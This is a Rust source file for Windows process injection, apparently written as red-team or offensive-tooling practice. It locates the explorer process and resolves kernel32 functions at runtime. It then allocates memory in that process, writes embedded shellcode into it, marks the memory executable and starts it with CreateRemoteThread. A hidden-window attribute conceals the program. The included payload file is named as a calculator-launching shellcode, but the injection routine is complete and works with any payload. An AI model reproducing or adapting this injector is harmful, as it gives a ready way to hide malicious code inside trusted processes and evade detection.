#![windows_subsystem = "windows"]

use libloading::{Library, Symbol};
use std::ffi::c_void;
use std::ptr::{null, null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};

static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
static SIZE: usize = SHELLCODE.len();

const PROCESS_ALL_ACCESS: u32 = 0x1fffff;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_READWRITE: u32 = 0x04;
const FALSE: i32 = 0;

#[cfg(target_os = "windows")]
fn main() {
    let mut old = PAGE_READWRITE;

    let mut system = System::new();
    system.refresh_processes();
    let pid = system
        .processes_by_name("explorer")
        .next()
        .expect("no process")
        .pid()
        .as_u32();

    unsafe {
        let kernel32 = Library::new("kernel32.dll").expect("no kernel32.dll");

        let open_process: Symbol<unsafe extern "C" fn(u32, i32, u32) -> isize> =
            kernel32.get(b"OpenProcess\0").expect("no OpenProcess");

        let virtual_alloc_ex: Symbol<
            unsafe extern "C" fn(isize, *const c_void, usize, u32, u32) -> *mut c_void,
        > = kernel32
            .get(b"VirtualAllocEx\0")
            .expect("no VirtualAllocEx");

        let write_process_memory: Symbol<
            unsafe extern "C" fn(isize, *const c_void, *const c_void, usize, *mut usize) -> i32,
        > = kernel32
            .get(b"WriteProcessMemory\0")
            .expect("np WriteProcessMemory");

        let virtual_protect_ex: Symbol<
            unsafe extern "C" fn(isize, *const c_void, usize, u32, *mut u32) -> i32,
        > = kernel32
            .get(b"VirtualProtectEx\0")
            .expect("no VirtualProtectEx");

        let create_remote_thread: Symbol<
            unsafe extern "C" fn(
                isize,
                *const c_void,
                usize,
                *const c_void,
                u32,
                *mut u32,
            ) -> isize,
        > = kernel32
            .get(b"CreateRemoteThread\0")
            .expect("no CreateRemoteThread");

        let close_handle: Symbol<unsafe extern "C" fn(isize) -> u32> =
            kernel32.get(b"CloseHandle").expect("no CloseHandle");

        let handle = open_process(PROCESS_ALL_ACCESS, 0, pid);

        let dest = virtual_alloc_ex(
            handle,
            null(),
            SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if dest == null_mut() {
            eprintln!("virtual_alloc_ex failed!");
            return;
        }

        let res = write_process_memory(
            handle,
            dest,
            SHELLCODE.as_ptr() as *const c_void,
            SIZE,
            null_mut(),
        );
        if res == FALSE {
            eprintln!("write_process_memory failed");
            return;
        }

        let res = virtual_protect_ex(handle, dest, SIZE, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            eprintln!("virtual_protect_ex failed!");
            return;
        }

        let thread = create_remote_thread(handle, null(), 0, dest, 0, null_mut());
        if thread == 0 {
            eprintln!("create_remote_thread failed!");
            return;
        }

        close_handle(handle);
    }
}
